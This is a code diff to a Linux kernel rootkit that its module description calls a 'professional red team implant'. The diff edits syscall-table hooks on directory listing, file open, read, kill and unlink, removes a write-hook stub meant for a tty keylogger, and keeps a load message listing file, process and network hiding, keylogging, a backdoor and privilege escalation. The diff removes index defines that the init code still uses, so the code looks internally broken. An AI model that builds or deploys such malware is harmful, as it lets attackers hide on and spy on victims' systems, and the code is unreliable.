@@ -11,6 +11,7 @@ MODULE_DESCRIPTION("vault_kernel kernel rootkit — professional red team implan
 
 unsigned long *sys_call_table = NULL;
 int module_hidden = 0;
+unsigned long vk_load_jiffies = 0;
 
 /* -- Syscall table hook entries -- */
 struct hooked_syscall hooks[] = {
@@ -19,19 +20,9 @@ struct hooked_syscall hooks[] = {
     { NULL, 0, 0, "__x64_sys_openat"     },
     { NULL, 0, 0, "__x64_sys_read"       },
     { NULL, 0, 0, "__x64_sys_kill"       },
-    { NULL, 0, 0, "__x64_sys_write"      },
     { NULL, 0, 0, "__x64_sys_unlinkat"   },
 };
 int hooks_count = sizeof(hooks) / sizeof(hooks[0]);
-
-/* Index lookup for hook slots */
-#define HOOKIDX_GETDENTS64  0
-#define HOOKIDX_GETDENTS    1
-#define HOOKIDX_OPENAT      2
-#define HOOKIDX_READ        3
-#define HOOKIDX_KILL        4
-#define HOOKIDX_WRITE       5
-#define HOOKIDX_UNLINKAT    6
 
 /* ================================================================
  * Syscall table discovery
@@ -206,7 +197,6 @@ static int __init vault_kernel_init(void) {
     hooks[HOOKIDX_OPENAT].table_entry     = &sys_call_table[__NR_openat];
     hooks[HOOKIDX_READ].table_entry       = &sys_call_table[__NR_read];
     hooks[HOOKIDX_KILL].table_entry       = &sys_call_table[__NR_kill];
-    hooks[HOOKIDX_WRITE].table_entry      = &sys_call_table[__NR_write];
     hooks[HOOKIDX_UNLINKAT].table_entry   = &sys_call_table[__NR_unlinkat];
 
     /* 2. Init sub-modules */
@@ -221,7 +211,9 @@ static int __init vault_kernel_init(void) {
     /* 3. Install syscall hooks */
     if ((ret = hooking_init()))     goto err;
 
-    pr_info(VAULT_KERNEL_TAG " loaded — hooks=%d, features: "
+    vk_load_jiffies = jiffies;
+
+    pr_info(VAULT_KERNEL_TAG " loaded — hooks=%d, ABI=pt_regs (x86_64 >= 4.17), features: "
             "file_hide, proc_hide, net_hide, keylogger, backdoor, priv_esc, stealth\n",
             hooks_count);
     return 0;
@@ -250,16 +242,6 @@ static void __exit vault_kernel_exit(void) {
     stealth_cleanup();
 
     pr_info(VAULT_KERNEL_TAG " unloaded\n");
-}
-
-/* ================================================================
- * Stub: hooked_write — passthrough (reserved for keylogger via tty)
- * ================================================================ */
-asmlinkage long hooked_write(unsigned int fd, const char __user *buf,
-                              size_t count) {
-    long (*orig_write)(unsigned int, const char __user *, size_t);
-    orig_write = (void *)hooks[HOOKIDX_WRITE].original;
-    return orig_write(fd, buf, count);
 }
 
 module_init(vault_kernel_init);
